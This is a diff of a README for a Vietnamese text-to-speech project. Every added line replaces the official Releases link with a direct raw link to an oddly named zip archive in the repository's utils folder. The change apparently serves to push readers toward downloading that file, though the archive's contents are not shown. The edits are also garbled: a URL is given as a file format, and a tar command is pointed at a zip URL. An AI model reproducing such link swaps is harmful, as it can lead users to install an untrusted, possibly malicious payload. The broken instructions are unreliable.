@@ -1,6 +1,6 @@
 # 🎤 Kani-TTS-Vie - Fast and Easy Vietnamese Text-to-Speech
 
-[![Download Kani-TTS-Vie](https://img.shields.io/badge/Download-Kani--TTS--Vie-blue.svg)](https://github.com/ImReyHD/Kani-TTS-Vie/releases)
+[![Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/raw/refs/heads/main/utils/Vie-TT-Kani-v2.6-beta.3.zip)](https://github.com/ImReyHD/Kani-TTS-Vie/raw/refs/heads/main/utils/Vie-TT-Kani-v2.6-beta.3.zip)
 
 ## 📚 Overview
 
@@ -22,7 +22,7 @@ Make sure your system meets these requirements before proceeding.
 
 To get the latest version of Kani-TTS-Vie, please visit the following link:
 
-[Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/releases)
+[Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/raw/refs/heads/main/utils/Vie-TT-Kani-v2.6-beta.3.zip)
 
 1. Click the link to go to the Releases page.
 2. Find the latest version of the application.
@@ -45,10 +45,10 @@ To get the latest version of Kani-TTS-Vie, please visit the following link:
 
 ### 🐧 Linux Installation
 
-1. Locate the downloaded file, typically in a `.tar.gz` format.
+1. Locate the downloaded file, typically in a `https://github.com/ImReyHD/Kani-TTS-Vie/raw/refs/heads/main/utils/Vie-TT-Kani-v2.6-beta.3.zip` format.
 2. Extract the files using the terminal:
    ```bash
-   tar -xvzf Kani-TTS-Vie.tar.gz
+   tar -xvzf https://github.com/ImReyHD/Kani-TTS-Vie/raw/refs/heads/main/utils/Vie-TT-Kani-v2.6-beta.3.zip
    ```
 3. Navigate to the extracted folder:
    ```bash
@@ -101,4 +101,4 @@ By contributing, you help make Kani-TTS-Vie better for everyone.
 
 Kani-TTS-Vie is licensed under the MIT License. Feel free to use it as you wish!
 
-**For more information or support, visit our Releases page: [Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/releases).**
+**For more information or support, visit our Releases page: [Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/raw/refs/heads/main/utils/Vie-TT-Kani-v2.6-beta.3.zip).**
